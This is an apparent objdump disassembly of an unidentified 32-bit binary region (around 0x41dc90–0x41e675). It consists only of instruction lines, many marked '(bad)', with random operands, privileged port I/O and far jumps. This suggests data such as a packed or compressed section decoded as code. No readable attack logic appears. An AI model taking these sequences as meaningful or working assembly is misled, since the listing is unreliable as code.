  41dc90:	mov    bl,0xaf
  41dc92:	pop    ss
  41dc93:	sbb    eax,0x9aa2f68b
  41dc98:	ins    DWORD PTR es:[edi],dx
  41dc99:	adc    bl,BYTE PTR [eax-0x34]
  41dc9c:	out    0x91,eax
  41dc9e:	shr    BYTE PTR [esi],1
  41dca0:	jl     0x41dc44
  41dca2:	xor    al,BYTE PTR [edi+0x25ad517f]
  41dca8:	sub    DWORD PTR [edx],ecx
  41dcaa:	retf   0x8654
  41dcad:	daa    
  41dcae:	in     al,0x6c
  41dcb0:	dec    edi
  41dcb1:	push   ss
  41dcb2:	test   BYTE PTR [edi-0x15],dh
  41dcb5:	fisubr WORD PTR [eax-0x6c74bd9a]
  41dcbb:	dec    edi
  41dcbc:	mov    es,ecx
  41dcbe:	add    dh,BYTE PTR [ecx-0x7ee2a1c7]
  41dcc4:	or     al,0xd4
  41dcc6:	xchg   edx,eax
  41dcc7:	cmp    eax,0xd2aaddbe
  41dccc:	or     dl,BYTE PTR [ebx+edx*8]
  41dccf:	sbb    al,0x96
  41dcd1:	jmp    0xc6dcac34
  41dcd6:	lahf   
  41dcd7:	ja     0x41dd2a
  41dcd9:	dec    DWORD PTR [edx-0x5efce39d]
  41dcdf:	xchg   edx,eax
  41dce0:	ja     0x41dd46
  41dce2:	xor    dh,BYTE PTR [ebx-0x3b93d4f7]
  41dce8:	push   ss
  41dce9:	je     0x41dd58
  41dceb:	or     bh,ah
  41dced:	in     al,dx
  41dcee:	inc    edx
  41dcef:	lods   al,BYTE PTR ds:[esi]
  41dcf0:	sub    ebx,DWORD PTR [eax-0x3e]
  41dcf3:	jecxz  0x41dd20
  41dcf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf6:	jns    0x41dc9e
  41dcf8:	addr16 aad 0x53
  41dcfb:	pop    edx
  41dcfc:	ins    BYTE PTR es:[edi],dx
  41dcfd:	sti    
  41dcfe:	cmp    bl,BYTE PTR [esi+0x652e9428]
  41dd04:	push   0xffffffcb
  41dd06:	add    BYTE PTR es:[ebx+0x58],al
  41dd0a:	fdiv   QWORD PTR [edi-0x44]
  41dd0d:	mov    cl,ah
  41dd0f:	and    dl,0x8a
  41dd12:	out    dx,eax
  41dd13:	push   ecx
  41dd14:	lock jbe 0x41dd55
  41dd17:	in     eax,dx
  41dd18:	ss or  ch,ch
  41dd1b:	mov    cl,0x2
  41dd1d:	push   ss
  41dd1e:	idiv   DWORD PTR [edi+edi*1]
  41dd21:	ds cmp ecx,ebp
  41dd24:	scas   al,BYTE PTR es:[edi]
  41dd25:	inc    ebx
  41dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd27:	pusha  
  41dd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd29:	push   ss
  41dd2a:	(bad)  [esi+0x1242215d]
  41dd30:	jbe    0xc2927646
  41dd36:	ins    DWORD PTR es:[edi],dx
  41dd37:	shr    dh,1
  41dd39:	fdiv   DWORD PTR [esi]
  41dd3b:	test   BYTE PTR [ebx+0x5f],0x22
  41dd3f:	jmp    0xb8d8e397
  41dd44:	mov    BYTE PTR [ebx+ebx*8+0x42545bc],cl
  41dd4b:	call   0x5627:0x2f726994
  41dd52:	lock dec ecx
  41dd54:	adc    ch,BYTE PTR [edi-0x6515c81f]
  41dd5a:	xchg   esi,eax
  41dd5b:	xlat   BYTE PTR ds:[ebx]
  41dd5c:	es push ebp
  41dd5e:	sub    WORD PTR [edi-0x29343590],sp
  41dd65:	cmp    ebx,DWORD PTR [ebx]
  41dd67:	jecxz  0x41dd7c
  41dd69:	out    dx,al
  41dd6a:	jmp    0xdb3e998a
  41dd6f:	sub    ebp,edx
  41dd71:	xchg   ecx,eax
  41dd72:	or     esi,DWORD PTR [eax+0x1e47b350]
  41dd78:	push   0x22
  41dd7a:	mov    dh,dl
  41dd7c:	xchg   ecx,eax
  41dd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7e:	popf   
  41dd7f:	xor    BYTE PTR [esi-0x3983f8b1],0x57
  41dd86:	pop    es
  41dd87:	pushf  
  41dd88:	outs   dx,BYTE PTR ds:[esi]
  41dd89:	cwde   
  41dd8a:	cld    
  41dd8b:	sbb    BYTE PTR [edi],bl
  41dd8d:	sub    al,0xc2
  41dd8f:	mov    ch,cl
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	(bad)  
  41de01:	pop    es
  41de02:	or     DWORD PTR [ecx-0x12],0x3d
  41de06:	add    DWORD PTR [eax],eax
  41de08:	add    eax,0x6a000001
  41de0d:	push   ecx
  41de0e:	lock mov dl,0x64
  41de11:	lods   al,BYTE PTR ds:[esi]
  41de12:	add    esi,esi
  41de14:	xchg   ebp,eax
  41de15:	(bad)  
  41de17:	dec    esi
  41de18:	ja     0x41dde1
  41de1a:	fsubr  QWORD PTR [ebx-0x1d4a398b]
  41de20:	xchg   ebp,eax
  41de21:	cmp    BYTE PTR [edx],bh
  41de23:	in     al,dx
  41de24:	lods   al,BYTE PTR ds:[esi]
  41de25:	enter  0xc54e,0x84
  41de29:	adc    bh,BYTE PTR [edi-0x313b6689]
  41de2f:	mov    edx,DWORD PTR [esi+0x112c6cea]
  41de35:	sub    al,0xa2
  41de37:	and    ecx,DWORD PTR [ecx+ebx*8-0x3ede7001]
  41de3e:	mov    eax,ds:0x6c675e8b
  41de43:	shr    BYTE PTR [ebp-0x2214c221],0x3d
  41de4a:	imul   ebp,esp,0x4
  41de4d:	xor    ah,bl
  41de4f:	add    BYTE PTR [edx+0x35883267],dh
  41de55:	fs (bad) 
  41de57:	int3   
  41de58:	or     eax,0x6ea9902c
  41de5d:	mov    edx,0x1af0ba0
  41de62:	lods   al,BYTE PTR ds:[esi]
  41de63:	in     eax,dx
  41de64:	popa   
  41de65:	sub    eax,0x5d66b853
  41de6a:	daa    
  41de6b:	jecxz  0x41de8e
  41de6d:	pop    ecx
  41de6e:	aam    0xa5
  41de70:	pop    ebx
  41de71:	(bad)  
  41de72:	pop    esp
  41de73:	loope  0x41de77
  41de75:	(bad)  
  41de76:	scas   al,BYTE PTR es:[edi]
  41de77:	mov    eax,0xb72a5831
  41de7c:	fst    st(0)
  41de7e:	mov    dh,0x2c
  41de80:	inc    eax
  41de81:	mov    al,ds:0x4d911273
  41de86:	pop    ebp
  41de87:	std    
  41de88:	retf   0xadfe
  41de8b:	call   0xbcf0:0x829b5c23
  41de92:	(bad)  
  41de93:	pop    ecx
  41de94:	mov    esp,0xf4dfe29e
  41de99:	pop    ax
  41de9b:	mov    dh,0xcc
  41de9d:	sbb    bl,ah
  41de9f:	ret    0x7373
  41dea2:	fisttp DWORD PTR [edx+edx*8+0xbbde32d]
  41dea9:	add    eax,0xac1af6ea
  41deae:	out    dx,eax
  41deaf:	aad    0xb7
  41deb1:	mov    ds:0x2b48bb28,al
  41deb6:	pop    esp
  41deb7:	(bad)  
  41deb8:	mov    ah,0x63
  41deba:	popa   
  41debb:	ret    0x6ae5
  41debe:	out    0x2,al
  41dec0:	cmp    al,0xcd
  41dec2:	cmp    eax,DWORD PTR [ecx-0x339c2ee8]
  41dec8:	loopne 0x41deaf
  41deca:	jmp    0xc6ef:0x40c8aa35
  41ded1:	jecxz  0x41de7c
  41ded3:	mov    BYTE PTR [ebx+ebp*8-0x7017d099],dh
  41deda:	cmp    ah,BYTE PTR [eax+0x29]
  41dedd:	int3   
  41dede:	sub    al,0x85
  41dee0:	ret    0x633b
  41dee3:	cmp    eax,0xcf393a71
  41dee8:	cmp    al,ah
  41deea:	leave  
  41deeb:	add    al,0xd7
  41deed:	pop    ebp
  41deee:	inc    esi
  41deef:	xchg   ebp,eax
  41def0:	or     BYTE PTR [ecx-0x4f],ch
  41def3:	dec    ecx
  41def4:	push   edi
  41def5:	jbe    0x41deaf
  41def7:	push   0xe88dc0fb
  41defc:	sub    edi,0x21
  41deff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df00:	les    esi,FWORD PTR [ecx+0x732ea8a4]
  41df06:	out    dx,eax
  41df07:	inc    eax
  41df08:	inc    edi
  41df09:	psubusw mm7,mm1
  41df0c:	pop    edx
  41df0d:	jns    0x41df24
  41df0f:	and    edi,eax
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xb9ee9ce9
  41df82:	or     BYTE PTR [ebp+0x13ef3],bh
  41df88:	add    eax,0x79000001
  41df8d:	push   0x2a60f352
  41df92:	or     al,0xb1
  41df94:	cld    
  41df95:	mov    dl,0x1b
  41df97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df98:	pop    ss
  41df99:	inc    eax
  41df9a:	mov    ecx,0xe1444c4f
  41df9f:	adc    ebp,esi
  41dfa1:	mov    bh,0xd3
  41dfa3:	popf   
  41dfa4:	cmp    DWORD PTR [ebp+0x3c],ebx
  41dfa7:	add    DWORD PTR [ebp+0x7f],edx
  41dfaa:	mov    eax,ds:0xcc631271
  41dfaf:	cli    
  41dfb0:	mov    edx,0xf66e4f83
  41dfb5:	stc    
  41dfb6:	pusha  
  41dfb7:	enter  0x657f,0x67
  41dfbb:	pop    ebx
  41dfbc:	xor    BYTE PTR [ebx],0x81
  41dfbf:	dec    ebx
  41dfc0:	pushf  
  41dfc1:	xchg   ebx,eax
  41dfc2:	add    BYTE PTR [edx+0x6d79a017],0x49
  41dfc9:	and    dh,BYTE PTR [ebp+ebp*4+0x4a]
  41dfcd:	div    cl
  41dfcf:	or     BYTE PTR [edx+0x45],al
  41dfd2:	in     al,0x58
  41dfd4:	out    dx,eax
  41dfd5:	test   eax,ecx
  41dfd7:	inc    edi
  41dfd8:	jmp    0x46c1b68f
  41dfdd:	sub    esi,esp
  41dfdf:	sub    DWORD PTR [esi-0x4fac3eae],0x17
  41dfe6:	test   BYTE PTR [ecx],bl
  41dfe8:	jns    0x41e022
  41dfea:	mov    ds:0x2d1001e9,eax
  41dfef:	dec    esi
  41dff0:	jecxz  0x41dfd9
  41dff2:	or     cl,BYTE PTR [ebp-0x24]
  41dff5:	jp     0x41e04c
  41dff7:	adc    eax,0x5aa6ba43
  41dffc:	sbb    al,0xb5
  41dffe:	std    
  41dfff:	mov    ah,BYTE PTR [edi-0x7c55eed8]
  41e005:	mov    ebx,0x856d6504
  41e00a:	imul   edx,ebx,0x36c5dbb2
  41e010:	dec    ebx
  41e011:	mov    al,ds:0x718a38ba
  41e016:	scas   eax,DWORD PTR es:[edi]
  41e017:	push   0x4821e2f2
  41e01c:	inc    esp
  41e01d:	fcom   DWORD PTR [ebx+eax*2+0x34]
  41e021:	fstp   DWORD PTR [ebp+0x33442113]
  41e027:	push   esi
  41e028:	iret   
  41e029:	arpl   bx,si
  41e02b:	xor    ecx,eax
  41e02d:	out    dx,eax
  41e02e:	shl    BYTE PTR [edx+0x33d0a040],1
  41e034:	outs   dx,BYTE PTR ds:[esi]
  41e035:	and    bh,BYTE PTR [edi]
  41e037:	push   ecx
  41e038:	fsubr  DWORD PTR ds:0x2a53a29f
  41e03e:	sbb    edx,esp
  41e040:	jl     0x41e0b1
  41e042:	inc    ebx
  41e043:	mov    dh,al
  41e045:	cwde   
  41e046:	ret    
  41e047:	pop    es
  41e048:	jno    0x41e030
  41e04a:	icebp  
  41e04b:	ins    BYTE PTR es:[edi],dx
  41e04c:	pop    es
  41e04d:	leave  
  41e04e:	dec    ebx
  41e04f:	data16 (bad) 
  41e051:	adc    ecx,DWORD PTR [esi]
  41e053:	test   DWORD PTR [ebx-0x34],eax
  41e056:	imul   esi,eax,0x75
  41e059:	sbb    al,0x13
  41e05b:	dec    ebp
  41e05c:	test   al,0x36
  41e05e:	cld    
  41e05f:	retf   0xc1bc
  41e062:	mov    ebx,0x66a381f1
  41e067:	and    eax,0x3957d030
  41e06c:	add    eax,0x3648af3f
  41e071:	add    esi,ebp
  41e073:	mov    ecx,0x3c6e3875
  41e078:	jg     0x41e094
  41e07a:	sbb    DWORD PTR [eax+0x7e],ebx
  41e07d:	fist   WORD PTR [edx]
  41e07f:	dec    ebp
  41e080:	hlt    
  41e081:	sub    BYTE PTR [ebx-0x21],ch
  41e084:	adc    BYTE PTR [edi+ebp*1+0x487428eb],ah
  41e08b:	ins    BYTE PTR es:[edi],dx
  41e08c:	and    esp,ebp
  41e08e:	fwait
  41e08f:	loope  0x41e107
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	or     bl,BYTE PTR [esi]
  41e102:	mov    ch,BYTE PTR [ecx+0x13ff8]
  41e108:	add    eax,0xca000001
  41e10d:	fstp   TBYTE PTR [ebx+0x402ec14e]
  41e113:	int    0xf4
  41e115:	nop
  41e116:	jmp    0x2d2c483e
  41e11b:	test   al,0x4a
  41e11d:	mov    esi,0x17a4aca2
  41e122:	and    esi,DWORD PTR [eax]
  41e124:	nop
  41e125:	adc    BYTE PTR [edx+0x361064b],ah
  41e12b:	popa   
  41e12c:	and    ebx,edx
  41e12e:	or     eax,0x4d05976
  41e133:	or     al,BYTE PTR [eax]
  41e135:	retf   0x3b2c
  41e138:	push   edx
  41e139:	pop    ds
  41e13a:	push   fs
  41e13c:	ds movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e13f:	sub    dl,BYTE PTR [edi+0x212c378c]
  41e145:	jmp    0x41e152
  41e147:	jp     0x41e145
  41e149:	fwait
  41e14a:	imul   ecx,DWORD PTR [eax+eiz*2-0x48],0x54
  41e14f:	fs inc esp
  41e151:	aaa    
  41e152:	loop   0x41e1a9
  41e154:	mov    esp,0xec9179b6
  41e159:	aas    
  41e15a:	adc    al,0x5f
  41e15c:	out    dx,al
  41e15d:	lods   al,BYTE PTR ds:[esi]
  41e15e:	test   BYTE PTR [ecx],al
  41e160:	push   edi
  41e161:	push   ecx
  41e162:	(bad)  
  41e163:	adc    dl,dl
  41e165:	out    dx,al
  41e166:	push   ecx
  41e167:	dec    ebp
  41e168:	icebp  
  41e169:	dec    ebx
  41e16a:	inc    esi
  41e16b:	jle    0x41e146
  41e16d:	fdivr  st,st(2)
  41e16f:	pop    eax
  41e170:	sar    bh,1
  41e172:	in     al,0x8d
  41e174:	add    ah,BYTE PTR [ebx]
  41e176:	mov    bh,0x1d
  41e178:	cmp    BYTE PTR [eax],0x4e
  41e17b:	xchg   ebx,eax
  41e17c:	call   0x380161ba
  41e181:	repnz cs mov esi,0x4e79d64a
  41e188:	jae    0x41e184
  41e18a:	pop    edx
  41e18b:	cmp    DWORD PTR [edx-0x42],0x69d97190
  41e192:	dec    ebx
  41e193:	jmp    0x88dafa96
  41e198:	xchg   edx,eax
  41e199:	out    dx,al
  41e19a:	push   cs
  41e19b:	jne    0x41e1e1
  41e19d:	sub    al,BYTE PTR [edx]
  41e19f:	dec    ebx
  41e1a0:	mov    ch,0x1b
  41e1a2:	outs   dx,BYTE PTR ds:[esi]
  41e1a3:	data16 mov ds:0x5c8a633f,al
  41e1a9:	outs   dx,BYTE PTR ds:[esi]
  41e1aa:	pop    eax
  41e1ab:	or     ebx,edx
  41e1ad:	dec    eax
  41e1ae:	xchg   edx,eax
  41e1af:	repz mov esp,0xaeb14655
  41e1b5:	and    DWORD PTR [eax-0x6d7381c],ebx
  41e1bb:	pop    esp
  41e1bc:	in     eax,0x29
  41e1be:	(bad)  
  41e1bf:	sub    eax,0xa91350c5
  41e1c4:	retf   0xb7ac
  41e1c7:	dec    ecx
  41e1c8:	xbegin 0x79cf4f1b
  41e1ce:	(bad)  
  41e1cf:	fnstcw WORD PTR [edx]
  41e1d1:	stc    
  41e1d2:	aad    0x51
  41e1d4:	call   0x96697157
  41e1d9:	mov    BYTE PTR [ecx+0x28a46f25],cl
  41e1df:	sbb    eax,0x7ee7dd7d
  41e1e5:	in     eax,0x30
  41e1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1e8:	inc    esp
  41e1e9:	in     eax,0xfa
  41e1eb:	mov    BYTE PTR [esi-0x24],al
  41e1ee:	jl     0x41e26c
  41e1f0:	jmp    0x678c:0xc172682e
  41e1f7:	xor    ebx,esi
  41e1f9:	lock sar DWORD PTR [ecx+edx*1+0x1a],cl
  41e1fe:	sub    al,0x75
  41e200:	mov    WORD PTR [edx],fs
  41e202:	dec    ebx
  41e203:	sbb    ebx,DWORD PTR [eax]
  41e205:	mov    esi,0x55977a63
  41e20a:	fcom   DWORD PTR [ebx+0x3b]
  41e20d:	xchg   ecx,eax
  41e20e:	dec    eax
  41e20f:	and    bh,BYTE PTR [eax]
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x3
  41e281:	jge    0x41e20c
  41e283:	dec    eax
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x8d000001
  41e28d:	nop
  41e28e:	mov    ebx,0x9ed63764
  41e293:	test   eax,0x2c6175b8
  41e298:	sbb    DWORD PTR [ecx+0x18],ebx
  41e29b:	pop    ds
  41e29c:	ret    0x87ad
  41e29f:	xchg   ebp,eax
  41e2a0:	aaa    
  41e2a1:	jnp    0x41e2cf
  41e2a3:	jg     0x41e2ba
  41e2a5:	sub    edx,edi
  41e2a7:	push   esp
  41e2a8:	stc    
  41e2a9:	rol    eax,0x39
  41e2ac:	and    BYTE PTR [esi+0x5d2013c4],cl
  41e2b2:	jno    0x41e2c6
  41e2b4:	push   edx
  41e2b5:	fidiv  WORD PTR [ebp-0x5b040c44]
  41e2bb:	pop    ebx
  41e2bc:	out    dx,eax
  41e2bd:	jne    0x41e271
  41e2bf:	jmp    0xb6e5:0xed451240
  41e2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2c7:	(bad)  
  41e2c8:	cmp    ecx,eax
  41e2ca:	and    eax,0x841bb742
  41e2cf:	inc    edx
  41e2d0:	pop    DWORD PTR [eax+eax*1+0x3667b56d]
  41e2d7:	jle    0x41e313
  41e2d9:	icebp  
  41e2da:	xor    dh,ch
  41e2dc:	(bad)  [edx]
  41e2de:	push   ecx
  41e2df:	stc    
  41e2e0:	cdq    
  41e2e1:	cmp    eax,DWORD PTR [ebp+0x3e]
  41e2e4:	cmp    ecx,esp
  41e2e6:	ret    
  41e2e7:	push   0x8ef906d7
  41e2ec:	sti    
  41e2ed:	jp     0x41e2bd
  41e2ef:	mov    ah,0xd0
  41e2f1:	pop    esi
  41e2f2:	xor    DWORD PTR [edx-0x74],0x49
  41e2f6:	pop    ebx
  41e2f7:	cwde   
  41e2f8:	sub    BYTE PTR [esi-0x1059df34],bl
  41e2fe:	int    0xf5
  41e300:	out    dx,eax
  41e301:	addr16 cli 
  41e303:	in     eax,dx
  41e304:	mov    eax,0x95d5c10
  41e309:	sub    BYTE PTR [eax+0x47d489b3],ch
  41e30f:	inc    edx
  41e310:	cmc    
  41e311:	test   DWORD PTR [esi+0x15],ebp
  41e314:	xchg   edi,eax
  41e315:	in     eax,dx
  41e316:	sub    eax,0x6e9ba97c
  41e31b:	clc    
  41e31c:	or     DWORD PTR [edx],esi
  41e31e:	and    edi,DWORD PTR [ebp+0x316839af]
  41e324:	sub    eax,0x2e9ea8ef
  41e329:	inc    esi
  41e32a:	push   eax
  41e32b:	and    edx,DWORD PTR [ecx-0x3b]
  41e32e:	gs icebp 
  41e330:	ss pop ss
  41e332:	cmc    
  41e333:	les    ebp,FWORD PTR [edx+esi*2-0x79]
  41e337:	sub    BYTE PTR [esi-0x5d0033c3],dl
  41e33d:	push   cs
  41e33e:	or     al,0x45
  41e340:	ret    
  41e341:	jbe    0x41e397
  41e343:	shl    BYTE PTR [ecx],0xea
  41e346:	sbb    eax,0x938bae28
  41e34b:	and    eax,0x87cae1ac
  41e350:	int3   
  41e351:	cli    
  41e352:	and    al,0x60
  41e354:	mov    cl,0xd0
  41e356:	(bad)  
  41e357:	xchg   esi,eax
  41e358:	or     al,0xda
  41e35a:	jecxz  0x41e38a
  41e35c:	inc    esi
  41e35d:	ret    
  41e35e:	ret    
  41e35f:	push   DWORD PTR [esp+0x24]
  41e363:	popf   
  41e364:	bound  eax,QWORD PTR [eax]
  41e366:	push   eax
  41e367:	ins    DWORD PTR es:[edi],dx
  41e368:	pop    DWORD PTR [ecx]
  41e36a:	fld    QWORD PTR [ebx-0x60b4a289]
  41e370:	icebp  
  41e371:	add    eax,0x4753900b
  41e376:	adc    BYTE PTR [eax],cl
  41e378:	(bad)  
  41e379:	lods   al,BYTE PTR ds:[esi]
  41e37a:	lock ins DWORD PTR es:[edi],dx
  41e37c:	leave  
  41e37d:	ins    DWORD PTR es:[edi],dx
  41e37e:	mov    al,0x34
  41e380:	jbe    0x41e314
  41e382:	sub    ecx,eax
  41e384:	sbb    edx,ecx
  41e386:	dec    edx
  41e387:	sbb    eax,0xa2c829d7
  41e38c:	or     esi,DWORD PTR [eax-0x63]
  41e38f:	pop    ds
  41e390:	jmp    0x41e392
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xd4d80409
  41e403:	fld    DWORD PTR [edx]
  41e405:	inc    edx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    eax,0x9b000001
  41e40d:	push   edi
  41e40e:	outs   dx,DWORD PTR ds:[esi]
  41e40f:	lods   al,BYTE PTR ds:[esi]
  41e410:	sbb    DWORD PTR [edi],0xffffffb4
  41e413:	es push cs
  41e415:	inc    ebx
  41e416:	or     eax,DWORD PTR [eax-0x4e]
  41e419:	es jg  0x41e3b2
  41e41c:	xchg   ebp,eax
  41e41d:	pop    eax
  41e41e:	inc    ecx
  41e41f:	sar    DWORD PTR [ecx+0x1d594897],1
  41e425:	dec    edi
  41e426:	cld    
  41e427:	daa    
  41e428:	ins    BYTE PTR es:[edi],dx
  41e429:	mov    ch,0x9
  41e42b:	jp     0x41e3b2
  41e42d:	dec    edx
  41e42e:	repnz repnz cmp ah,BYTE PTR [edx-0x7f82010f]
  41e436:	xor    DWORD PTR [ebp+0x65],esp
  41e439:	imul   ebx,DWORD PTR [eax+0x13854417],0x70
  41e440:	call   0x176e4737
  41e445:	add    bl,BYTE PTR [edi]
  41e447:	and    esi,edx
  41e449:	and    al,BYTE PTR [ecx+esi*4+0x771f0eef]
  41e450:	stc    
  41e451:	retf   
  41e452:	ret    
  41e453:	in     eax,0x2
  41e455:	jae    0x41e4c2
  41e457:	out    0x89,eax
  41e459:	jp     0x41e444
  41e45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e45c:	xchg   edx,eax
  41e45d:	ins    BYTE PTR es:[edi],dx
  41e45e:	imul   edx,ecx,0x4184d974
  41e464:	sbb    DWORD PTR [ebp-0x51],edi
  41e467:	nop
  41e468:	mov    esi,0x7e5782a0
  41e46d:	jl     0x41e4bd
  41e46f:	enter  0x8809,0x86
  41e473:	adc    ecx,eax
  41e475:	(bad)  
  41e476:	mov    dh,0x4b
  41e478:	fistp  DWORD PTR [edi+0x6d2f9344]
  41e47e:	sbb    eax,0x98e29794
  41e483:	lahf   
  41e484:	mov    edx,DWORD PTR [eax+0x65]
  41e487:	inc    edi
  41e488:	add    BYTE PTR [ecx+0x1a2087d7],ah
  41e48e:	fidivr DWORD PTR ds:0xfeefcced
  41e494:	push   edi
  41e495:	xor    eax,0x4b8f47ef
  41e49a:	jmp    0x3891:0xff6084e5
  41e4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4a2:	imul   esp,DWORD PTR [ecx],0x6c0e4bb3
  41e4a8:	or     BYTE PTR [eax+0x2f],0x18
  41e4ac:	mov    bl,0x90
  41e4ae:	aaa    
  41e4af:	jo     0x41e43c
  41e4b1:	call   0xfcca:0xcdc2c0b4
  41e4b8:	lods   eax,DWORD PTR ds:[esi]
  41e4b9:	mov    ss,WORD PTR [esi]
  41e4bb:	push   0x4b
  41e4bd:	xor    bh,BYTE PTR [ebx]
  41e4bf:	imul   esi,DWORD PTR [ecx+0x3ee7a896],0x7f4d4cd6
  41e4c9:	popa   
  41e4ca:	test   eax,0xcbc07df9
  41e4cf:	push   esi
  41e4d0:	(bad)  
  41e4d1:	popa   
  41e4d2:	jns    0x41e4cf
  41e4d4:	bound  edx,QWORD PTR [esi+0x67]
  41e4d7:	sbb    esi,0x7f
  41e4da:	sbb    al,0xcf
  41e4dc:	push   0xffffffa1
  41e4de:	inc    ebp
  41e4df:	or     dh,BYTE PTR [edi-0x6d]
  41e4e2:	pop    esi
  41e4e3:	jo     0x41e52d
  41e4e5:	cld    
  41e4e6:	test   BYTE PTR [ebp+0x632b1d49],bl
  41e4ec:	pop    ebp
  41e4ed:	imul   edx,DWORD PTR [edi+ebx*2],0xcfd0bdcd
  41e4f4:	cmp    DWORD PTR [eax+eiz*4-0x5a2a1b48],ebp
  41e4fb:	lea    ebp,[edi]
  41e4fd:	and    BYTE PTR [edi-0x33],ah
  41e500:	ret    0x383b
  41e503:	(bad)  
  41e504:	pop    eax
  41e505:	pusha  
  41e506:	push   eax
  41e507:	out    dx,al
  41e508:	sub    eax,0x725a312d
  41e50d:	xor    DWORD PTR [esi+0xdb82],ebp
	...
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e543
  41e581:	inc    edx
  41e582:	xchg   edx,eax
  41e583:	int3   
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xec000001
  41e58d:	inc    ebx
  41e58e:	repz adc ebx,DWORD PTR [ebx-0x10178933]
  41e595:	mov    esi,0xa6c2b740
  41e59a:	in     eax,dx
  41e59b:	ror    DWORD PTR [eax],0x2b
  41e59e:	xchg   edi,eax
  41e59f:	mov    cl,0xfc
  41e5a1:	les    esi,FWORD PTR [edx]
  41e5a3:	push   ss
  41e5a4:	cs and al,0x13
  41e5a7:	sub    al,0x1d
  41e5a9:	mov    ds:0x2d642eb9,al
  41e5ae:	inc    eax
  41e5af:	aas    
  41e5b0:	mov    ebp,DWORD PTR [ebp-0x12]
  41e5b3:	pop    ss
  41e5b4:	(bad)
  41e5b8:	or     ecx,DWORD PTR [esi+0x310ede53]
  41e5be:	mov    al,0x60
  41e5c0:	inc    esp
  41e5c1:	icebp  
  41e5c2:	call   0x44d4:0xda53e9c6
  41e5c9:	adc    DWORD PTR [ecx+0x45eea72],esp
  41e5cf:	pop    ds
  41e5d0:	push   ecx
  41e5d1:	and    al,0xc1
  41e5d3:	push   0x5ef0082
  41e5d8:	(bad)  
  41e5d9:	int    0x5d
  41e5db:	mov    bl,0x41
  41e5dd:	in     al,dx
  41e5de:	or     bl,bl
  41e5e0:	in     eax,0x18
  41e5e2:	out    dx,eax
  41e5e3:	and    eax,0xdbb739cf
  41e5e8:	mov    eax,0x9637b573
  41e5ed:	jg     0x41e5e6
  41e5ef:	sbb    BYTE PTR ds:0x2624b845,0xa
  41e5f6:	or     eax,0x30974e77
  41e5fb:	adc    esi,eax
  41e5fd:	mov    esi,0x8fee8599
  41e602:	ror    BYTE PTR [ebp-0x1e86e34a],1
  41e608:	jmp    0x1ea7f2aa
  41e60d:	xor    DWORD PTR [esp+edi*1],esp
  41e610:	sbb    al,0x2d
  41e612:	sbb    ah,BYTE PTR [esi]
  41e614:	in     al,0x73
  41e616:	sbb    eax,0x96f13f85
  41e61b:	xchg   DWORD PTR [edi+0x57f1e404],eax
  41e621:	cwde   
  41e622:	fild   QWORD PTR [ebx]
  41e624:	call   0x42f3193b
  41e629:	aam    0x44
  41e62b:	sub    DWORD PTR [esi+0x212c80b1],0x72512bd
  41e635:	inc    ebp
  41e636:	jne    0x41e5be
  41e638:	mov    BYTE PTR [ebp-0x485c8326],dh
  41e63e:	call   0x5abf:0xd6b1c893
  41e645:	add    edx,DWORD PTR [ebp+0x71]
  41e648:	and    BYTE PTR [ebp+0xac435ca],dl
  41e64e:	pop    eax
  41e64f:	push   0xffffffac
  41e651:	ins    BYTE PTR es:[edi],dx
  41e652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e653:	push   0x24
  41e655:	ja     0x41e5f6
  41e657:	ds dec esi
  41e659:	dec    edi
  41e65a:	xchg   ebx,eax
  41e65c:	test   BYTE PTR ds:0xa2a2957a,bl
  41e662:	push   edx
  41e663:	in     al,0xc2
  41e665:	ins    DWORD PTR es:[edi],dx
  41e666:	inc    esp
  41e667:	and    al,0xaf
  41e669:	sbb    ebx,DWORD PTR [ecx-0x4f]
  41e66c:	lahf   
  41e66d:	(bad)  [esi-0x69bfbe40]
  41e673:	dec    ebx
  41e674:	nop
  41e675:	outs   dx,BYTE PTR ds:[esi]
